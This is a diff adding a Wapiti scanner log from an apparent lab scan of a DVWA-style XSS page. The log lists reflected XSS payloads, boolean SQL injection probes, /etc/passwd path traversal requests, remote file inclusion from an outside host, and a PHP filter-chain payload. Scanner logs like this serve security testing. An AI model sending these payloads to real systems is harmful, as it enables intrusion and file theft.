@@ -1,0 +1,201 @@
+2024-03-20 12:47:25.387 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:25.488 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:25.488 | VERBOSE  | wapitiCore.net.explorer:_async_analyze:286 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:25.599 | GREEN    | wapitiCore.controller.wapiti:save_scan_state:359 - [*] Saving scan state, please wait...
+2024-03-20 12:47:25.599 | INFO     | wapitiCore.controller.wapiti:save_scan_state:363 - This scan has been saved in the file /home/wapiti/.wapiti/scans/web_folder_59964006.db
+2024-03-20 12:47:25.602 | INFO     | wapitiCore.main.wapiti:wapiti_main:380 - [*] Wapiti found 3 URLs and forms during the scan
+2024-03-20 12:47:25.633 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:289 - [*] Existing modules:
+2024-03-20 12:47:25.633 | INFO     | wapitiCore.controller.wapiti:_load_attack_modules:290 - 	 backup, brute_login_form, buster, cookieflags, crlf, csp, csrf, drupal_enum, exec, file, htaccess, htp, http_headers, https_redirect, log4shell, methods, nikto, permanentxss, redirect, shellshock, spring4shell, sql, ssl, ssrf, takeover, timesql, upload, wapp, wp_enum, xss, xxe
+2024-03-20 12:47:25.725 | ERROR    | wapitiCore.controller.wapiti:_load_attack_modules:298 - [!] Unable to import module ssl: No module named 'humanize'
+2024-03-20 12:47:25.744 | ERROR    | wapitiCore.controller.wapiti:filter_modules_with_options:130 - [!] Unable to find a module named ssl
+2024-03-20 12:47:25.744 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module xss
+2024-03-20 12:47:25.759 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:25.787 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3CScRiPt%3Ealert%28%27wfvrunw8u9%27%29%3C%2FsCrIpT%3E (0)
+2024-03-20 12:47:25.801 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3CScRiPt%3Ealert%28%22wfvrunw8u9%22%29%3C%2FsCrIpT%3E (0)
+2024-03-20 12:47:25.817 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3CScRiPt%3Ealert%28%2Fwfvrunw8u9%2F%29%3C%2FsCrIpT%3E (0)
+2024-03-20 12:47:25.830 | VERBOSE  | wapitiCore.attack.mod_xss:attempt_exploit:138 - [¨] GET http://web/vulnerabilities/xss_r/?name=%3CSvG%2FoNloAd%3Dalert%28%2Fwfvrunw8u9%2F%29%3E (0)
+2024-03-20 12:47:25.915 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:205 - ---
+2024-03-20 12:47:25.915 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:206 - Reflected Cross Site Scripting in http://web/vulnerabilities/xss_r/ via injection in the parameter name
+2024-03-20 12:47:25.916 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:216 - Evil request:
+2024-03-20 12:47:25.916 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:217 -     GET /vulnerabilities/xss_r/?name=%3CSvG%2FoNloAd%3Dalert%28%2Fwfvrunw8u9%2F%29%3E HTTP/1.1
+    host: web
+    connection: keep-alive
+    user-agent: Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0
+    accept-language: en-US
+    accept-encoding: gzip, deflate, br
+    accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    cookie: security=high
+2024-03-20 12:47:25.916 | RED      | wapitiCore.attack.mod_xss:attempt_exploit:218 - ---
+2024-03-20 12:47:25.926 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:25.933 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:25.949 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module sql
+2024-03-20 12:47:25.963 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:25.963 | VERBOSE  | wapitiCore.attack.mod_sql:error_based_attack:368 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%C2%BF%27%22%28 (0)
+2024-03-20 12:47:25.984 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%20AND%2076%3D94%20AND%2074%3D74 (0)
+2024-03-20 12:47:25.999 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%20AND%2059%3D87%20AND%2037%3D37 (0)
+2024-03-20 12:47:26.014 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%20AND%2076%3D76%20AND%2082%3D82 (0)
+2024-03-20 12:47:26.032 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%20AND%2072%3D125%20AND%20%2768%27%3D%2768 (0)
+2024-03-20 12:47:26.046 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%20AND%2065%3D143%20AND%20%2710%27%3D%2710 (0)
+2024-03-20 12:47:26.061 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%20AND%2098%3D98%20AND%20%2731%27%3D%2731 (0)
+2024-03-20 12:47:26.076 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%20AND%2057%3D150%20AND%20%2272%22%3D%2272 (0)
+2024-03-20 12:47:26.091 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%20AND%2010%3D90%20AND%20%2297%22%3D%2297 (0)
+2024-03-20 12:47:26.105 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%20AND%2011%3D11%20AND%20%2232%22%3D%2232 (0)
+2024-03-20 12:47:26.120 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%29%20AND%2065%3D126%20AND%20%2876%3D76 (0)
+2024-03-20 12:47:26.137 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%29%20AND%2090%3D165%20AND%20%2880%3D80 (0)
+2024-03-20 12:47:26.152 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%29%20AND%2053%3D53%20AND%20%2884%3D84 (0)
+2024-03-20 12:47:26.168 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%29%20AND%2017%3D41%20AND%20%28%2715%27%3D%2715 (0)
+2024-03-20 12:47:26.183 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%29%20AND%2040%3D130%20AND%20%28%2763%27%3D%2763 (0)
+2024-03-20 12:47:26.200 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%27%29%20AND%2052%3D52%20AND%20%28%2711%27%3D%2711 (0)
+2024-03-20 12:47:26.216 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%29%20AND%2092%3D142%20AND%20%28%2233%22%3D%2233 (0)
+2024-03-20 12:47:26.233 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%29%20AND%2063%3D149%20AND%20%28%2287%22%3D%2287 (0)
+2024-03-20 12:47:26.248 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%22%29%20AND%2013%3D13%20AND%20%28%2271%22%3D%2271 (0)
+2024-03-20 12:47:26.272 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=default (1)
+2024-03-20 12:47:26.285 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%20AND%2096%3D138%20AND%2057%3D57 (1)
+2024-03-20 12:47:26.304 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%20AND%2023%3D107%20AND%2016%3D16 (1)
+2024-03-20 12:47:26.322 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%20AND%2025%3D25%20AND%2017%3D17 (1)
+2024-03-20 12:47:26.346 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%20AND%2096%3D168%20AND%20%2766%27%3D%2766 (1)
+2024-03-20 12:47:26.366 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%20AND%2029%3D74%20AND%20%2727%27%3D%2727 (1)
+2024-03-20 12:47:26.387 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%20AND%2096%3D96%20AND%20%2728%27%3D%2728 (1)
+2024-03-20 12:47:26.407 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%20AND%2077%3D95%20AND%20%2292%22%3D%2292 (1)
+2024-03-20 12:47:26.427 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%20AND%2034%3D61%20AND%20%2272%22%3D%2272 (1)
+2024-03-20 12:47:26.443 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%20AND%2052%3D52%20AND%20%2259%22%3D%2259 (1)
+2024-03-20 12:47:26.466 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%29%20AND%2085%3D97%20AND%20%2889%3D89 (1)
+2024-03-20 12:47:26.486 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%29%20AND%2014%3D106%20AND%20%2819%3D19 (1)
+2024-03-20 12:47:26.507 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%29%20AND%2050%3D50%20AND%20%2817%3D17 (1)
+2024-03-20 12:47:26.521 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%29%20AND%2011%3D92%20AND%20%28%2739%27%3D%2739 (1)
+2024-03-20 12:47:26.535 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%29%20AND%2011%3D54%20AND%20%28%2711%27%3D%2711 (1)
+2024-03-20 12:47:26.549 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%27%29%20AND%2019%3D19%20AND%20%28%2781%27%3D%2781 (1)
+2024-03-20 12:47:26.567 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%29%20AND%2060%3D119%20AND%20%28%2287%22%3D%2287 (1)
+2024-03-20 12:47:26.583 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%29%20AND%2051%3D143%20AND%20%28%2243%22%3D%2243 (1)
+2024-03-20 12:47:26.603 | VERBOSE  | wapitiCore.attack.mod_sql:boolean_based_attack:517 - [¨] GET http://web/vulnerabilities/xss_r/?name=default%22%29%20AND%2082%3D82%20AND%20%28%2297%22%3D%2297 (1)
+2024-03-20 12:47:26.628 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/ (1)
+2024-03-20 12:47:26.658 | GREEN    | wapitiCore.controller.wapiti:attack:459 - [*] Launching module file
+2024-03-20 12:47:26.671 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/vulnerabilities/xss_r/?name=fuzz (0)
+2024-03-20 12:47:26.674 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (0)
+2024-03-20 12:47:26.683 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (0)
+2024-03-20 12:47:26.692 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:26.701 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:26.716 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fservices (0)
+2024-03-20 12:47:26.727 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:26.742 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 12:47:26.755 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (0)
+2024-03-20 12:47:26.764 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (0)
+2024-03-20 12:47:26.774 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:26.785 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:26.798 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (0)
+2024-03-20 12:47:26.808 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (0)
+2024-03-20 12:47:26.818 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (0)
+2024-03-20 12:47:26.827 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:26.835 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:26.845 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:26.856 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:26.869 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 12:47:26.883 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 12:47:26.895 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:26.909 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:26.918 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:26.929 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:26.941 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:26.951 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:26.962 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
+2024-03-20 12:47:26.974 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:26.996 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 12:47:27.007 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:27.017 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 12:47:27.028 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.037 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.046 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.057 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 12:47:27.066 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.076 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 12:47:27.084 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/vulnerabilities/xss_r/?name=fuzz%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
